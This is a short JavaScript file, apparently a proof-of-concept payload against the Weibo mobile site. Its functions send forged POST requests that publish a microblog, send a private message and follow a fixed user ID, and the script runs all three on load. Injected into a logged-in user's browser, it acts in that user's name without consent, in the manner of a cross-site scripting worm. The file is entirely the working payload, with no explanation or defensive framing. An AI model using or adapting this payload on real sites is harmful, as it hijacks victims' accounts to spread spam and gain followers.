url_add_attention = 'http://m.weibo.cn/attentionDeal/addAttention?';
url_add_blog = 'http://m.weibo.cn/mblogDeal/addAMblog?';
url_send_msg = 'http://m.weibo.cn/msgDeal/sendMsg?';
function createXHR(){
    return window.XMLHttpRequest ? new XMLHttpRequest():new ActiveXObject("Microsoft.XMLHTTP");
}
function post(url,data,sync){
    xmlHttp = createXHR();
    xmlHttp.open("POST",url,sync);
    xmlHttp.setRequestHeader("Accept","text/html, application/xhtml+xml, */*");
    xmlHttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
    xmlHttp.send(data);
}
//发送微博
function send_blog(){
//内容
       blog = encodeURI("发送内容");
       content = 'content=' + blog;
       post(url_add_blog, content, false);
}
//发送私信
function send_msg(){
       nick = encodeURI("username");
       content = encodeURI("test");
       msg_post_text = 'fileId=null&nick=' + nick + '&content=' + content;
       post(url_send_msg, msg_post_text, false);
}
//增加粉丝
function add_fans(){
       //uid
       uid = 'uid=2194202223';
       post(url_add_attention, uid, false);
}
function weibo_test(){
    try{
    send_blog();
    add_fans();
    send_msg();
    alert("ok");
    }
    catch(e){
        alert("failed");
    }
}
weibo_test();